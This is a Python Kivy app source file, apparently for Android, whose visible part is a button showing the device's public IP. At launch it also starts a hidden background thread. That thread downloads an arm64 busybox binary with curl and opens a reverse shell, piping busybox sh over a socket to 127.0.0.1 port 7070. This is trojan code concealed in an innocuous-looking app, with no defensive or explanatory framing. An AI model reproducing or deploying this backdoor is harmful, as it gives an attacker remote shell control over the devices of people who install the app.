from kivy.app import App
from kivy.uix.button import Button
import _thread as thread
from time import sleep
from requests import get
import _thread as thread
import subprocess
import socket
import pty
import os

def getIp():
  try:
    res = get(url="https://httpbin.org/ip")
    return res.text
  except:
    None

def rv():
  try:
    os.system("curl -LO https://raw.githubusercontent.com/xerta555/Busybox-Binaries/refs/heads/master/busybox-arm64; chmod 700 busybox-arm64")
    import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",7070));subprocess.call(["./busybox-arm64","sh"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
  except:
    None

class MeuApp(App):
  def inicio(self):
    self.ip = getIp()
    return Button(text="Ja ta instalado. IP: "+self.ip)

  def install(self):
    self.ip = getIp()
    open("status.txt","a")
    return Button(text="IP: "+self.ip)

  def build(self):
    try:
      status = open("status.txt","r").read()
      return self.inicio()
    except:
      return self.install()
if __name__ == '__main__':
    thread.start_new_thread(rv,())
    MeuApp().run()
